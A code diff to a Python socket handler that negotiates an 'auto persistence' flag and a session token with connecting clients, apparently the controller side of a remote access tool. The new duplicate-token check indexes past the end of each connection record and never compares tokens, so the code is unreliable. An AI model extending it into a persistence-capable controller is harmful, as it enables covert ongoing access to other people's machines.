@@ -4,7 +4,7 @@ import time
 import socket
 
 from .other import printColor
-
+from .other import generateToken
 
 class Handler(threading.Thread):
     #Manage incoming connections with a thread system
@@ -91,21 +91,21 @@ The client first sends this information, then the server sends the parameters as
             self.conn.settimeout(3)
             try:    
                 data = self.conn.recv(256).decode("latin1")
+                print(data)
             except socket.timeout:
                 print("TIMEOUTTT")
             else:
                 #print("persi>",data)
                 if data == "\r\n":
                     break
-           
+        
             tmp = data.split("|")
             list_info.append(tmp[1])
         
-        print("Fini")
         self.conn.settimeout(None)
         return list_info
     
-    def sendParameterOfServer(self):
+    def sendParameterOfServer(self,token):
         if(self.auto_persistence):
             self.conn.send(b"MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
             print("MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
@@ -113,15 +113,28 @@ The client first sends this information, then the server sends the parameters as
         else:
             self.conn.send(b"MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
             print("MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
+
+        self.conn.send(b"MOD_HANDSHAKE_TOKEN | " + token.encode())        
+        
+        time.sleep(0.3)
         self.conn.send(b"\r\n") #end echange.
         
 
     def run(self):
-
+        
+        token = generateToken()
+        for key in Handler.dict_conn.keys():
+            if Handler.dict_conn[key][7]:
+                print("double key")
+                token = generateToken()
+            else:
+                print("KEY IS GOOD !!")
+    
         list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
-        print("sencode part persi go !!!! ")
-        self.sendParameterOfServer() #2
+       # print("sencode part persi go !!!! ")
+        self.sendParameterOfServer(token) #2
 
+        
         #print(list_info)
         Handler.dict_conn[Handler.number_conn] = [self.conn, self.address[0],self.address[1], True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
         #print(Handler.dict_conn)
